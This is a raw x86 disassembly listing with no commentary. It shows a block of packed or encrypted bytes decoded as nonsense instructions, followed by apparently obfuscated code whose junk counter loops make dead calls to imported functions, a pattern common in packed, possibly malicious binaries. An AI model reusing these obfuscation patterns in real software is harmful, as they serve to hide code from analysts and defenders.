  40bb92:	sub    DWORD PTR [eax],ebp
  40bb94:	and    al,0x27
  40bb96:	cdq    
  40bb97:	ret    0x4c8b
  40bb9a:	pop    ecx
  40bb9b:	addr16 nop
  40bb9d:	sbb    al,0x51
  40bb9f:	xchg   esp,eax
  40bba0:	sub    al,0xa6
  40bba2:	xchg   ecx,eax
  40bba3:	mov    bh,0x7d
  40bba5:	sbb    eax,0xdecede57
  40bbaa:	popf   
  40bbab:	xor    eax,0x76caca86
  40bbb0:	cs cld 
  40bbb2:	pop    edi
  40bbb3:	ins    BYTE PTR es:[edi],dx
  40bbb4:	add    eax,0x5ae824cd
  40bbb9:	dec    esp
  40bbba:	or     dh,BYTE PTR [edx-0x49]
  40bbbd:	adc    cl,BYTE PTR [esi+0x74435efe]
  40bbc3:	jno    0x40bbdd
  40bbc5:	outs   dx,DWORD PTR ds:[esi]
  40bbc6:	sar    ebx,cl
  40bbc8:	inc    ebp
  40bbc9:	mov    esp,0xc2f51724
  40bbce:	icebp  
  40bbcf:	push   esi
  40bbd0:	imul   esp,DWORD PTR [edi-0x3a],0x52
  40bbd4:	scas   eax,DWORD PTR es:[edi]
  40bbd5:	jp     0x40bc2c
  40bbd7:	push   es
  40bbd8:	fdivr  DWORD PTR [edi+0x55154428]
  40bbde:	inc    edx
  40bbdf:	loop   0x40bb8a
  40bbe1:	sti    
  40bbe2:	scas   al,BYTE PTR es:[edi]
  40bbe3:	dec    edx
  40bbe4:	aad    0xd0
  40bbe6:	fld    st(7)
  40bbe8:	cmp    al,0xf6
  40bbea:	xor    DWORD PTR [esi-0x7],esi
  40bbed:	fdivrp st(5),st
  40bbef:	pop    edx
  40bbf0:	icebp  
  40bbf1:	push   ss
  40bbf2:	mov    eax,0x2c692bcf
  40bbf7:	push   edi
  40bbf8:	dec    esi
  40bbf9:	xchg   edi,eax
  40bbfa:	jmp    0x925a:0xeb7e0df0
  40bc01:	mov    ds:0x51505f43,eax
  40bc06:	xchg   ebx,eax
  40bc07:	and    eax,0x5900f60e
  40bc0c:	mov    ds:0x90dc3c39,al
  40bc11:	jmp    0x40bc09
  40bc13:	sbb    al,0xe6
  40bc15:	push   edi
  40bc16:	test   al,0x0
  40bc18:	(bad)  
  40bc19:	loope  0x40bbd9
  40bc1b:	dec    edi
  40bc1c:	and    DWORD PTR [ecx+0x19a9eb3d],ebx
  40bc22:	and    DWORD PTR [ebx+0xe],eax
  40bc25:	outs   dx,BYTE PTR ds:[esi]
  40bc26:	jns    0x40bbc8
  40bc28:	js     0x40bc5e
  40bc2a:	xchg   DWORD PTR fs:[edi+0x6d94fc27],ebx
  40bc31:	jnp    0x40bc9e
  40bc33:	and    BYTE PTR [eax],bl
  40bc35:	mov    es,WORD PTR [ebx]
  40bc37:	mov    ?,esi
  40bc39:	ja     0x40bbd1
  40bc3b:	fmul   QWORD PTR [esi+0x79]
  40bc3e:	pop    esi
  40bc3f:	jbe    0x40bbd8
  40bc41:	scas   al,BYTE PTR es:[edi]
  40bc42:	push   0xffffffb5
  40bc44:	xor    eax,0x11d84988
  40bc49:	sbb    cl,0x81
  40bc4c:	push   eax
  40bc4d:	ds inc edi
  40bc4f:	test   DWORD PTR [edi+0x61ab0a2f],0x414cac95
  40bc59:	sbb    eax,0x59145019
  40bc5e:	stos   BYTE PTR es:[edi],al
  40bc5f:	adc    esp,ebp
  40bc61:	outs   dx,DWORD PTR ds:[esi]
  40bc62:	loope  0x40bc48
  40bc64:	push   ebp
  40bc65:	adc    ah,bl
  40bc67:	and    BYTE PTR [eax-0x7c],dl
  40bc6a:	xchg   esi,eax
  40bc6b:	xor    BYTE PTR [ebx-0x645faf79],0x2a
  40bc72:	jmp    0x7f9d2759
  40bc77:	arpl   WORD PTR [ebp+0x18b84fb4],si
  40bc7d:	mov    dh,BYTE PTR [edi+edx*2]
  40bc80:	add    edx,DWORD PTR [edi]
  40bc82:	dec    eax
  40bc83:	retf   0x7031
  40bc86:	push   cs
  40bc87:	ja     0x40bccb
  40bc89:	test   al,0xfd
  40bc8b:	fneni(8087 only) 
  40bc8d:	imul   DWORD PTR [ebx]
  40bc8f:	ret    0x7c6f
  40bc92:	arpl   WORD PTR [esi-0x46815ab0],si
  40bc98:	and    BYTE PTR [ecx+0x30],dh
  40bc9b:	mov    ds:0xac5a607d,eax
  40bca0:	pop    ebx
  40bca2:	jbe    0x40bcd2
  40bca4:	popa   
  40bca5:	lds    esi,FWORD PTR [ebp-0x7]
  40bca8:	test   al,0x50
  40bcaa:	pop    esp
  40bcab:	push   ds
  40bcac:	mov    ds:0xe6feb201,eax
  40bcb1:	jge    0x40bc56
  40bcb3:	ror    DWORD PTR [ebx],0x90
  40bcb6:	mov    eax,ds:0x97615a40
  40bcbb:	(bad)  
  40bcbc:	jnp    0x40bc7a
  40bcbe:	jmp    0x10385fb4
  40bcc3:	jnp    0x40bcc9
  40bcc5:	pop    esp
  40bcc6:	jmp    0xfa8f288e
  40bccb:	jnp    0x40bd13
  40bccd:	pop    DWORD PTR [edi-0x73aef1c9]
  40bcd3:	xor    al,0xe2
  40bcd5:	or     dl,BYTE PTR [esi+eax*2]
  40bcd8:	mov    ?,WORD PTR [edx+0x24]
  40bcdb:	fisttp WORD PTR [ebp-0x64383111]
  40bce1:	rcr    edi,cl
  40bce3:	jg     0x40bc96
  40bce5:	cmp    esp,edx
  40bce7:	pop    ds
  40bce8:	mov    ah,0x4c
  40bcea:	js     0x40bc6d
  40bcec:	nop
  40bced:	mov    ch,0x72
  40bcef:	xor    eax,0x8cea0540
  40bcf4:	out    0xb,eax
  40bcf6:	add    al,BYTE PTR [eax-0x35]
  40bcf9:	out    0x72,al
  40bcfb:	imul   BYTE PTR [eax-0x7f]
  40bcfe:	cwde   
  40bcff:	outs   dx,DWORD PTR ds:[esi]
  40bd00:	add    bh,bh
  40bd02:	push   eax
  40bd03:	cmc    
  40bd04:	sub    eax,0xf452b40d
  40bd09:	ins    BYTE PTR es:[edi],dx
  40bd0a:	push   ebp
  40bd0b:	push   ss
  40bd0c:	lahf   
  40bd0d:	mov    esp,0x3e5f615c
  40bd12:	push   esi
  40bd13:	nop
  40bd14:	or     eax,0xab3377ed
  40bd19:	aaa    
  40bd1a:	and    edi,DWORD PTR [ecx]
  40bd1c:	and    DWORD PTR [edx],esi
  40bd1e:	dec    ebx
  40bd1f:	sahf   
  40bd20:	cmp    DWORD PTR [ebp-0x49],esp
  40bd23:	imul   BYTE PTR [edi+0x1b7b4375]
  40bd29:	mov    edi,0x8d761525
  40bd2e:	ror    DWORD PTR [eax-0x50255b06],1
  40bd34:	mov    DWORD PTR [eax+ecx*4-0xb81e41f],eax
  40bd3b:	jno    0x40bd48
  40bd3d:	(bad)  
  40bd3e:	(bad)  
  40bd40:	outs   dx,BYTE PTR ds:[esi]
  40bd41:	add    dl,BYTE PTR [esi-0x433d40a6]
  40bd47:	sbb    al,BYTE PTR [ecx+0x50]
  40bd4a:	or     DWORD PTR [edx-0x743caac4],eax
  40bd50:	or     DWORD PTR [ecx+0x31ce908],ecx
  40bd56:	add    BYTE PTR [eax],al
  40bd58:	out    0x4c,al
  40bd5a:	xor    al,0x30
  40bd5c:	mov    ah,0x70
  40bd5e:	loop   0x40bda8
  40bd60:	into   
  40bd61:	xor    BYTE PTR [ecx],bl
  40bd63:	xchg   esp,eax
  40bd64:	sar    BYTE PTR [ebp-0xf],0x41
  40bd68:	sbb    al,0x82
  40bd6a:	jle    0x40bdea
  40bd6c:	jp     0x40bdeb
  40bd6e:	jle    0x40bdee
  40bd70:	and    edi,esp
  40bd72:	retf   0x35a8
  40bd75:	sub    bh,BYTE PTR [ebp+0x4e9427da]
  40bd7b:	and    edx,DWORD PTR [edx+0x34]
  40bd7e:	jb     0x40bd8b
  40bd80:	xor    DWORD PTR [esi+0x60c1a250],ebx
  40bd86:	adc    BYTE PTR [ecx+0x49],bh
  40bd89:	push   ecx
  40bd8a:	mov    DWORD PTR [ebx-0x3f9f0ecf],edx
  40bd90:	test   bl,ah
  40bd92:	dec    esp
  40bd93:	or     al,0x9a
  40bd95:	mov    eax,ds:0xdeb29250
  40bd9a:	shl    DWORD PTR [esp+ebp*8],0x21
  40bd9e:	retf   0x12d0
  40bda1:	xchg   ebx,eax
  40bda2:	jb     0x40bdb3
  40bda4:	inc    eax
  40bda5:	or     eax,0xdb18ef5a
  40bdaa:	rol    DWORD PTR [ecx-0x7a],cl
  40bdad:	stos   BYTE PTR es:[edi],al
  40bdae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdaf:	xchg   edx,eax
  40bdb0:	xchg   edi,eax
  40bdb1:	jns    0x40bd88
  40bdb3:	fwait
  40bdb4:	arpl   WORD PTR ds:0x58a967f3,bp
  40bdba:	aam    0x37
  40bdbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bdbd:	(bad)  
  40bdbe:	shl    bl,cl
  40bdc0:	jns    0x40bd50
  40bdc2:	adc    ah,BYTE PTR [edi]
  40bdc4:	rol    esi,cl
  40bdc6:	bts    DWORD PTR [esi-0x23b730b1],ebx
  40bdcd:	imul   ebp,DWORD PTR [ebx-0x7a],0xfffffff5
  40bdd1:	sti    
  40bdd2:	mov    ch,cl
  40bdd4:	sub    dl,BYTE PTR [eax]
  40bdd6:	add    ah,BYTE PTR [ebx+0x58]
  40bdd9:	cmp    esp,DWORD PTR [edx-0x1d994260]
  40bddf:	cmp    ah,cl
  40bde1:	xor    ebp,esi
  40bde3:	lock sbb BYTE PTR [edx+edx*2],ah
  40bde7:	loop   0x40be59
  40bde9:	shl    BYTE PTR [ecx],0xeb
  40bdec:	mov    ebx,0x2a809bc1
  40bdf1:	(bad)  [eax+0x4b]
  40bdf4:	add    eax,0xa5b0043c
  40bdf9:	je     0x40bdd3
  40bdfb:	ins    BYTE PTR es:[edi],dx
  40bdfc:	sub    DWORD PTR [edi+0x1ff503a5],0xffffffbb
  40be03:	outs   dx,DWORD PTR ds:[esi]
  40be04:	nop
  40be05:	or     esi,DWORD PTR [esi-0x6aa9e03e]
  40be0b:	retf   
  40be0c:	jecxz  0x40be5c
  40be0e:	cmp    ah,cl
  40be10:	rcr    cl,1
  40be12:	push   ss
  40be13:	sar    DWORD PTR [ebx-0x5e1f6eed],1
  40be19:	fld    QWORD PTR [ecx]
  40be1b:	add    eax,0x7d35a242
  40be20:	xor    al,0x78
  40be22:	sub    dh,BYTE PTR [ebx+edi*4]
  40be25:	mov    ds:0xff29b0a2,al
  40be2a:	(bad)  
  40be2b:	sub    eax,0xffa388d2
  40be30:	loopne 0x40be53
  40be32:	push   esp
  40be33:	jmp    0x40be15
  40be35:	retf   
  40be36:	push   ebp
  40be37:	dec    ebp
  40be38:	push   ebx
  40be39:	or     dl,BYTE PTR [edx-0x1376df24]
  40be3f:	adc    ah,BYTE PTR [edx-0x5c66ee68]
  40be45:	addr16 sbb al,0x88
  40be48:	xchg   ecx,eax
  40be49:	in     al,0x9d
  40be4b:	mov    bh,BYTE PTR [ebx+0x2dd2bf05]
  40be51:	xchg   edx,eax
  40be52:	inc    eax
  40be53:	sbb    DWORD PTR [edx-0x13],0xffffffbf
  40be57:	int3   
  40be58:	dec    esi
  40be59:	loop   0x40bec3
  40be5b:	lods   eax,DWORD PTR ds:[esi]
  40be5c:	push   edi
  40be5d:	pop    ebx
  40be5e:	pop    esi
  40be5f:	cmp    DWORD PTR [ebp-0x9],esp
  40be62:	dec    eax
  40be63:	pop    esp
  40be64:	loope  0x40be2a
  40be66:	cmp    cl,cl
  40be68:	or     eax,0xe3c9cbce
  40be6d:	stc    
  40be6e:	aas    
  40be6f:	rol    DWORD PTR [eax-0x16ab4677],0xa5
  40be76:	mov    esi,0xc9d2e112
  40be7b:	ins    DWORD PTR es:[edi],dx
  40be7c:	jp     0x40be20
  40be7e:	(bad)  
  40be7f:	jge    0x40be59
  40be81:	mov    dl,0x2f
  40be83:	icebp  
  40be84:	imul   bl
  40be86:	mov    dh,BYTE PTR [ebp+0x3e04b734]
  40be8c:	pop    es
  40be8d:	or     al,0xac
  40be8f:	adc    al,0x27
  40be91:	push   edx
  40be92:	add    ebp,DWORD PTR ds:0xc59ef812
  40be98:	mov    cl,0x81
  40be9a:	mov    ah,ah
  40be9c:	push   eax
  40be9d:	dec    ebx
  40be9e:	repnz add al,0x8
  40bea1:	push   ds
  40bea2:	push   edi
  40bea3:	jb     0x40bebe
  40bea5:	sbb    BYTE PTR [ecx-0x73],al
  40bea8:	scas   al,BYTE PTR es:[edi]
  40bea9:	mov    al,ds:0x163d81d5
  40beae:	(bad)  
  40beaf:	or     DWORD PTR [ebx],edx
  40beb1:	in     eax,0x33
  40beb3:	lahf   
  40beb4:	push   ebp
  40beb5:	sbb    al,0xef
  40beb7:	mov    al,ds:0x4d251f62
  40bebc:	xchg   esi,eax
  40bebd:	add    al,0xc0
  40bebf:	gs mov esp,0x86a44217
  40bec5:	sahf   
  40bec6:	mov    dh,0x88
  40bec8:	das    
  40bec9:	xchg   DWORD PTR [ebx],ecx
  40becb:	fist   WORD PTR [ecx-0x69]
  40bece:	and    al,0xcf
  40bed0:	push   ds
  40bed1:	cmp    ecx,0x7b10014a
  40bed7:	jns    0x40be66
  40bed9:	push   es
  40beda:	jb     0x40be66
  40bedc:	sub    eax,0x8de46613
  40bee1:	sbb    ah,dl
  40bee3:	sbb    dl,BYTE PTR [ecx-0x6b129a6a]
  40bee9:	in     eax,0x90
  40beeb:	xor    eax,0x93863047
  40bef0:	xchg   edx,eax
  40bef1:	sub    esi,DWORD PTR [edx+0xab46d4d]
  40bef7:	jg     0x40beed
  40bef9:	dec    esi
  40befa:	fst    DWORD PTR [edi+esi*1+0x46]
  40befe:	or     esp,DWORD PTR [eax]
  40bf00:	xchg   DWORD PTR [esi],eax
  40bf02:	in     al,dx
  40bf03:	mov    esi,0x4e4f2db3
  40bf08:	repnz cmp al,0x30
  40bf0b:	jg     0x40bf40
  40bf0d:	sbb    BYTE PTR [ebx],dl
  40bf0f:	dec    ebx
  40bf10:	add    bl,dl
  40bf12:	pop    ecx
  40bf13:	loop   0x40bf32
  40bf15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf17:	outs   dx,BYTE PTR ds:[esi]
  40bf18:	adc    DWORD PTR [ebp-0x3bf2d037],0x10
  40bf1f:	enter  0xbd34,0xa5
  40bf23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf24:	lahf   
  40bf25:	cwde   
  40bf26:	push   esi
  40bf27:	ins    DWORD PTR es:[edi],dx
  40bf28:	dec    esp
  40bf29:	xchg   ecx,eax
  40bf2a:	outs   dx,DWORD PTR ds:[esi]
  40bf2b:	jp     0x40bf3f
  40bf2d:	pop    edi
  40bf2e:	jmp    0x40beb0
  40bf30:	sub    ah,BYTE PTR [edx-0x49]
  40bf33:	sahf   
  40bf34:	daa    
  40bf35:	fcmove st,st(4)
  40bf37:	adc    al,0x21
  40bf39:	jne    0x40bf31
  40bf3b:	mov    WORD PTR [ebx-0xadb2379],fs
  40bf41:	sahf   
  40bf42:	adc    ah,dl
  40bf44:	lea    cx,[edi-0x8]
  40bf48:	inc    eax
  40bf49:	imul   eax,edi,0x87d8f375
  40bf4f:	mov    esi,0x26a1582e
  40bf54:	jns    0x40bf8e
  40bf56:	pop    es
  40bf57:	sub    al,0x14
  40bf59:	push   ecx
  40bf5a:	jle    0x40bf54
  40bf5c:	cli    
  40bf5d:	push   0xffffffc4
  40bf5f:	jno    0x40bf82
  40bf61:	sti    
  40bf62:	xor    ah,BYTE PTR [eax+0x5c9ac842]
  40bf68:	inc    edi
  40bf69:	les    ebp,FWORD PTR [esi-0x6dac2d1a]
  40bf6f:	bound  ecx,QWORD PTR [eax+0xdefada7]
  40bf75:	sub    eax,0x2014efcd
  40bf7a:	lods   al,BYTE PTR ds:[esi]
  40bf7b:	dec    edi
  40bf7c:	fistp  WORD PTR [edx-0x64]
  40bf7f:	std    
  40bf80:	mov    dh,0x24
  40bf82:	aas    
  40bf83:	pop    ebx
  40bf84:	ret    0x2b21
  40bf87:	cwde   
  40bf88:	xchg   edx,eax
  40bf89:	pop    ds
  40bf8a:	jle    0x40bf36
  40bf8c:	push   ebx
  40bf8d:	ja     0x40bf50
  40bf8f:	jl     0x40bf4c
  40bf91:	mov    WORD PTR [edx],ss
  40bf93:	xlat   BYTE PTR ds:[ebx]
  40bf94:	dec    ebx
  40bf95:	scas   al,BYTE PTR es:[edi]
  40bf96:	sub    DWORD PTR [ebx-0x19],ebp
  40bf99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf9a:	adc    DWORD PTR [edi-0x208ef91f],0xae86abc1
  40bfa4:	jmp    0x933e:0x272e8910
  40bfab:	pusha  
  40bfac:	pop    edx
  40bfad:	mov    edi,0x89e61321
  40bfb2:	shl    bh,1
  40bfb4:	mov    esp,0xc1bd76e7
  40bfb9:	adc    edi,DWORD PTR [ebp-0x4ce84348]
  40bfbf:	daa    
  40bfc0:	loope  0x40bf52
  40bfc2:	fldenv [eax-0x209a01c7]
  40bfc8:	(bad)  
  40bfca:	xor    eax,0x108bfe0
  40bfcf:	dec    ebp
  40bfd0:	mov    dl,0x80
  40bfd2:	out    dx,al
  40bfd3:	pushf  
  40bfd4:	sahf   
  40bfd5:	cwde   
  40bfd6:	loopne 0x40c038
  40bfd8:	inc    ecx
  40bfd9:	add    BYTE PTR [edx],dl
  40bfdb:	stos   BYTE PTR es:[edi],al
  40bfdc:	pop    esi
  40bfdd:	or     DWORD PTR [ebp-0x2a],eax
  40bfe0:	lea    ebp,[edx+0x6]
  40bfe3:	inc    eax
  40bfe4:	mov    eax,ds:0x7fd52b58
  40bfe9:	and    DWORD PTR [ecx-0x3bbf277b],ecx
  40bfef:	retf   0xcd24
  40bff2:	sub    al,0x74
  40bff4:	mov    esi,0x1f7d0430
  40bff9:	jge    0x40c035
  40bffb:	fcom   DWORD PTR [ecx-0x48]
  40bffe:	pop    ebp
  40bfff:	sti    
  40c000:	enter  0xb9c4,0x40
  40c004:	pop    es
  40c005:	gs mov ebx,0xb22f6e5f
  40c00b:	cmp    ch,BYTE PTR [ecx-0x1fa1dda8]
  40c011:	aaa    
  40c012:	aas    
  40c013:	push   edi
  40c014:	push   ebx
  40c015:	pop    ecx
  40c016:	xlat   BYTE PTR ds:[ebx]
  40c017:	adc    ebp,ebp
  40c019:	cmp    BYTE PTR [eax+0x75],dl
  40c01c:	mov    edi,0x538c2948
  40c021:	loop   0x40c00b
  40c023:	fsub   st,st(0)
  40c025:	mov    esp,0x88d5ecaa
  40c02a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c02b:	add    DWORD PTR [edi-0x1e2fe891],0xffffff8a
  40c032:	add    BYTE PTR [esi+eiz*4-0x5ecd4237],0x36
  40c03a:	ja     0x40bfdd
  40c03c:	adc    bh,BYTE PTR ds:0x28c7bfff
  40c042:	idiv   BYTE PTR [ebx-0x14]
  40c045:	push   edx
  40c046:	scas   al,BYTE PTR es:[edi]
  40c047:	mov    cl,0x19
  40c04a:	iret   
  40c04b:	and    eax,0xa5514948
  40c050:	jmp    0x9f4e:0x92944451
  40c057:	test   BYTE PTR [esi],ah
  40c059:	dec    ebx
  40c05a:	das    
  40c05b:	xchg   ebx,eax
  40c05c:	(bad)  
  40c05d:	jns    0x40c01e
  40c05f:	push   eax
  40c060:	ds pop edx
  40c062:	cmp    bh,BYTE PTR ds:0x5893ee05
  40c068:	pop    ebx
  40c069:	popa   
  40c06a:	loop   0x40c087
  40c06c:	jbe    0x40bff1
  40c06e:	cwde   
  40c06f:	inc    edx
  40c070:	sbb    al,0xba
  40c072:	or     al,0xe9
  40c074:	mov    eax,DWORD PTR [ebp+0xc]
  40c077:	mov    eax,DWORD PTR [ebp+0x8]
  40c07a:	push   DWORD PTR [ebp-0x8]
  40c07d:	call   0x40746a
  40c082:	mov    eax,DWORD PTR [ebp-0xc]
  40c085:	cmp    eax,ebx
  40c087:	je     0x4098f8
  40c08d:	mov    eax,DWORD PTR [ebp-0x8]
  40c090:	mov    eax,DWORD PTR [eax]
  40c092:	pop    edi
  40c093:	pop    esi
  40c094:	pop    ebx
  40c095:	leave  
  40c096:	ret    0xc
  40c099:	push   ebp
  40c09a:	mov    ebp,esp
  40c09c:	sub    esp,0x30
  40c09f:	adc    DWORD PTR ds:0x433717,ecx
  40c0a5:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40c0ac:	xor    ecx,ecx
  40c0ae:	or     ecx,DWORD PTR ds:0x433727
  40c0b4:	and    DWORD PTR ds:0x433783,ecx
  40c0ba:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40c0c1:	mov    ecx,DWORD PTR [ebp-0x4]
  40c0c4:	mov    DWORD PTR ds:0x4337b7,0x13
  40c0ce:	cmp    DWORD PTR ds:0x4337b7,0x0
  40c0d5:	je     0x40c103
  40c0db:	cmp    DWORD PTR ds:0x4337b7,0x1a
  40c0e2:	jne    0x40c0f3
  40c0e8:	push   0x1b76
  40c0ed:	call   DWORD PTR ds:0x412020
  40c0f3:	mov    eax,ds:0x4337b7
  40c0f8:	dec    eax
  40c0f9:	mov    ds:0x4337b7,eax
  40c0fe:	jmp    0x40c0ce
  40c103:	push   ebx
  40c104:	mov    DWORD PTR ds:0x4337e7,0x19
  40c10e:	cmp    DWORD PTR ds:0x4337e7,0x0
  40c115:	je     0x40c1bf
  40c11b:	cmp    DWORD PTR ds:0x4337e7,0xa
  40c122:	jne    0x40c133
  40c128:	push   0x4904
  40c12d:	call   DWORD PTR ds:0x412024
  40c133:	cmp    DWORD PTR ds:0x4337e7,0xb
  40c13a:	jne    0x40c14d
  40c140:	mov    ebx,DWORD PTR ds:0x4337e7
  40c146:	dec    ebx
  40c147:	mov    DWORD PTR ds:0x4337e7,ebx
  40c14d:	mov    ebx,DWORD PTR ds:0x4337e7
  40c153:	dec    ebx
  40c154:	mov    DWORD PTR ds:0x4337e7,ebx
  40c15a:	jmp    0x40c10e
  40c15f:	mov    DWORD PTR ds:0x433783,0x1d
  40c169:	cmp    DWORD PTR ds:0x433783,0x0
  40c170:	je     0x40c1bf
  40c176:	cmp    DWORD PTR ds:0x433783,0x3
  40c17d:	jne    0x40c193
  40c183:	push   0x433880
  40c188:	push   0x400000
  40c18d:	call   DWORD PTR ds:0x412028
  40c193:	cmp    DWORD PTR ds:0x433783,0x4
  40c19a:	jne    0x40c1ad
  40c1a0:	mov    ebx,DWORD PTR ds:0x433783
  40c1a6:	dec    ebx
  40c1a7:	mov    DWORD PTR ds:0x433783,ebx
  40c1ad:	mov    ebx,DWORD PTR ds:0x433783
  40c1b3:	dec    ebx
  40c1b4:	mov    DWORD PTR ds:0x433783,ebx
  40c1ba:	jmp    0x40c169
  40c1bf:	mov    eax,0x7510854
  40c1c4:	adc    ebx,DWORD PTR ds:0x4337ab
  40c1ca:	xor    ecx,eax
  40c1cc:	mov    ebx,0x32729b
  40c1d1:	add    ecx,ebx
  40c1d3:	mov    DWORD PTR [ebp-0x1c],ecx
  40c1d6:	movzx  ecx,BYTE PTR ds:0x4337b7
  40c1dd:	xor    DWORD PTR ds:0x433713,ecx
  40c1e3:	mov    ecx,DWORD PTR [ebp+0x14]
  40c1e6:	or     DWORD PTR ds:0x43371b,0x43377b
  40c1f0:	push   esi
  40c1f1:	push   edi
  40c1f2:	test   ecx,ecx
  40c1f4:	mov    DWORD PTR ds:0x43372b,0x6070
  40c1fe:	je     0x40c2fb
  40c204:	mov    ecx,DWORD PTR [ebp+0x14]
  40c207:	mov    DWORD PTR ds:0x4337a7,0x1d
  40c211:	cmp    DWORD PTR ds:0x4337a7,0x0
  40c218:	je     0x40c2a6
  40c21e:	cmp    DWORD PTR ds:0x4337a7,0x29
  40c225:	jne    0x40c23a
  40c22b:	push   DWORD PTR [ebp-0xc]
  40c22e:	push   DWORD PTR [ebp-0x1c]
  40c231:	push   DWORD PTR [ebp-0x20]
  40c234:	call   DWORD PTR ds:0x41202c
  40c23a:	xor    esi,esi
  40c23c:	or     esi,DWORD PTR ds:0x4337a7
  40c242:	dec    esi
  40c243:	mov    DWORD PTR ds:0x4337a7,esi
  40c249:	jmp    0x40c211
  40c24e:	mov    DWORD PTR ds:0x4337eb,0x10
  40c258:	cmp    DWORD PTR ds:0x4337eb,0x0
  40c25f:	je     0x40c2a6
  40c265:	cmp    DWORD PTR ds:0x4337eb,0x2
  40c26c:	jne    0x40c278
  40c272:	call   DWORD PTR ds:0x4121d8
  40c278:	cmp    DWORD PTR ds:0x4337eb,0x3
  40c27f:	jne    0x40c292
  40c285:	mov    esi,DWORD PTR ds:0x4337eb
  40c28b:	dec    esi
  40c28c:	mov    DWORD PTR ds:0x4337eb,esi
  40c292:	mov    esi,DWORD PTR ds:0x4337eb
  40c298:	dec    esi
  40c299:	mov    DWORD PTR ds:0x4337eb,esi
  40c29f:	jmp    0x40c258
  40c2a4:	and    esi,edi
  40c2a6:	mov    ecx,DWORD PTR [ecx]
  40c2a8:	and    DWORD PTR ds:0x433733,0x0
  40c2b2:	jmp    0x40c2c4
  40c2b7:	mov    esi,DWORD PTR ds:0x433733
  40c2bd:	inc    esi
  40c2be:	mov    DWORD PTR ds:0x433733,esi
  40c2c4:	cmp    DWORD PTR ds:0x433733,0x15
  40c2cb:	jae    0x40c2f8
  40c2d1:	cmp    DWORD PTR ds:0x433733,0x1e
  40c2d8:	jne    0x40c2ed
  40c2de:	push   DWORD PTR [ebp-0xc]
  40c2e1:	push   DWORD PTR [ebp-0x1c]
  40c2e4:	push   DWORD PTR [ebp-0x18]
  40c2e7:	call   DWORD PTR ds:0x4123a4
  40c2ed:	jmp    0x40c2b7
  40c2f2:	sbb    DWORD PTR ds:0x4337f3,edx
  40c2f8:	mov    DWORD PTR [ebp-0x1c],ecx
  40c2fb:	mov    ecx,DWORD PTR ds:0x4337eb
  40c301:	adc    DWORD PTR ds:0x4337fb,ecx
  40c307:	imul   edx,eax
  40c30a:	mov    esi,DWORD PTR ds:0x43374b
  40c310:	xor    ecx,ecx
  40c312:	or     ecx,DWORD PTR ds:0x433787
  40c318:	sub    esi,ecx
  40c31a:	or     esi,DWORD PTR [esi+ecx*1]
  40c31d:	mov    ecx,0x4573
  40c322:	mov    esi,DWORD PTR ds:0x4337e3
  40c328:	mov    esi,DWORD PTR [esi]
  40c32a:	sub    DWORD PTR ds:0x43372f,esi
  40c330:	add    edx,ecx
  40c332:	mov    esi,0x7879
  40c337:	and    DWORD PTR ds:0x4337a7,edi
  40c33d:	mov    edi,0x1556
  40c342:	sbb    DWORD PTR ds:0x433733,0x433767
  40c34c:	xchg   esi,ecx
  40c34e:	and    DWORD PTR ds:0x4337ff,0x0
  40c358:	xor    ecx,ecx
  40c35a:	add    ecx,DWORD PTR ds:0x4337ff
  40c360:	inc    ecx
  40c361:	mov    DWORD PTR ds:0x4337ff,ecx
  40c367:	cmp    DWORD PTR ds:0x4337ff,0xf
  40c36e:	jne    0x40c37f
  40c374:	push   0x8dd2
  40c379:	call   DWORD PTR ds:0x4121dc
  40c37f:	cmp    DWORD PTR ds:0x4337ff,0xe
  40c386:	jne    0x40c399
  40c38c:	mov    ecx,DWORD PTR ds:0x4337ff
  40c392:	inc    ecx
  40c393:	mov    DWORD PTR ds:0x4337ff,ecx
  40c399:	cmp    DWORD PTR ds:0x4337ff,0x1d
  40c3a0:	jb     0x40c358
  40c3a6:	neg    ecx
  40c3a8:	sub    edx,edi
  40c3aa:	adc    ecx,DWORD PTR ds:0x43376b
  40c3b0:	xor    esi,esi
  40c3b2:	add    DWORD PTR ds:0x4337ab,0x7522
  40c3bc:	mov    DWORD PTR [ebp-0x28],esi
  40c3bf:	xor    ecx,0x6487
  40c3c5:	mov    DWORD PTR [ebp-0x2c],esi
  40c3c8:	or     DWORD PTR ds:0x4337ab,ecx
  40c3ce:	mov    DWORD PTR [ebp-0x14],esi
  40c3d1:	mov    DWORD PTR [ebp-0x8],esi
  40c3d4:	mov    ecx,DWORD PTR [ebp-0x18]
  40c3d7:	add    DWORD PTR ds:0x43382b,0x43383b
  40c3e1:	xor    ecx,eax
  40c3e3:	and    DWORD PTR ds:0x4337af,0x4337bf
  40c3ed:	xor    edi,edi
  40c3ef:	xor    DWORD PTR ds:0x4337c3,ebx
  40c3f5:	add    ecx,ebx
  40c3f7:	mov    DWORD PTR ds:0x433737,0x6c1e
  40c401:	mov    DWORD PTR [ebp-0x20],ecx
  40c404:	mov    DWORD PTR ds:0x43372b,edi
  40c40a:	mov    eax,DWORD PTR [ebp-0x20]
  40c40d:	je     0x40cc0f
  40c413:	sbb    DWORD PTR ds:0x43372f,0x13ee
  40c41d:	mov    eax,DWORD PTR [ebp-0x4]
  40c420:	adc    DWORD PTR ds:0x433723,0x47a9
  40c42a:	xor    eax,0x7510854
  40c42f:	sbb    DWORD PTR ds:0x4337e7,0x7bc1
  40c439:	add    eax,ebx
  40c43b:	cmp    edi,eax
  40c43d:	mov    DWORD PTR ds:0x4337f3,0x1580
  40c447:	jne    0x40c892
  40c44d:	push   DWORD PTR [ebp+0x8]
  40c450:	call   0x411718
  40c455:	mov    DWORD PTR [ebp-0x20],eax
  40c458:	adc    DWORD PTR ds:0x4337a7,edi
  40c45e:	mov    eax,DWORD PTR [ebp-0x4]
  40c461:	and    DWORD PTR ds:0x4337eb,0x0
  40c46b:	jmp    0x40c47f
  40c470:	xor    ecx,ecx
  40c472:	xor    ecx,DWORD PTR ds:0x4337eb
  40c478:	inc    ecx
  40c479:	mov    DWORD PTR ds:0x4337eb,ecx
  40c47f:	cmp    DWORD PTR ds:0x4337eb,0x1c
